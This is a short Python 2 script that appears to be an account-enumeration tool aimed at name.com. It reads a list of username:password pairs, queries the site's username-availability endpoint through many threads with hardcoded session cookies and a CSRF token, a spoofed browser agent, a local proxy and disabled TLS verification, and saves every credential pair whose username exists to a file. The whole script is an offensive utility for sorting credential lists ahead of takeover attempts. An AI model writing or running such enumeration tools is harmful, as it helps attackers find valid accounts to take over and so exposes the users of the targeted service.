# -*- coding: utf-8 -*-
import requests
import Queue
import codecs
import os
import urllib
import base64
from threading import Thread
from Crypto.Cipher import AES

requests.packages.urllib3.disable_warnings()


def check(q):
    while True:
        try:
            c = q.get()
            user = c.split(':')[0]
            passw = c.split(':')[1]
            work = False
            proxy = {
                     'http': '127.0.0.1:8888',
                     'https': '127.0.0.1:8888'
            }
            s = requests.session()
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
                'Accept-Encoding': 'gzip',
                'x-csrf-token-auth': '56e7ac9c51bf5e1da421ccbca792722cc43ec62fe27bf451f1090714c63fd26b39cf43019dd51cbc1a90c3cb652c9764578ddabb38404b283e1230d93b50feba',
                'Cookie': 'pmolt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ2aWQiOjU0MzIwMzc3fQ.6vD216tKhngqXsoxmv66EPHWF7DOtBN5cs2vGzizDQw; pmovt=c336388fc6c1d88d4d668e08e99cb111b1fac486; BIGipServername.com-PCI-80=186749962.20480.0000; cart_id=1455911513.0767-3224029a2caeb704e5e0f407a22d061be6277685; SnapABugRef=https%3A%2F%2Fwww.name.com%2F%20; SnapABugHistory=2#; REG_IDT=ok09e6732024biigj3m4cdkef1; cart_totals=0%7C0.00%7C0.00; SnapABugVisit=8#1455911499',
                'X-Requested-With': 'XMLHttpRequest'
            }
            r = s.post(
                        'https://www.name.com/account/create/ajax_available_username/',
                        'form_id=Account-creation&username={0}'.format(user),
                        verify=False,
                        headers=headers,
                        proxies=proxy
                    )
            if 'Sorry, that username is already in use' in r.text:
                print user, 'is registered!'
                f = open("registered.txt", "a")
                f.write('{0}\n'.format(c))
                f.close()
            else:
                print user, 'does not work!'
        except Exception, e:
            print e
            raw_input("Please Send Me The Error Message!")
        q.task_done()
    
def main():
    with codecs.open('tocheck.txt', 'r', encoding='utf-8') as f:
        users = f.readlines()
    with codecs.open('regthreads.txt', 'r', encoding='utf-8') as f:
        threads = f.read()
        
    queue = Queue.Queue()
    for _ in range(int(threads)):
        worker = Thread(target=check, args=(queue,))
        worker.start()
    for user in users:
        queue.put(user.strip().encode('ascii', 'ignore'))
            
if __name__ == '__main__':
    main()
        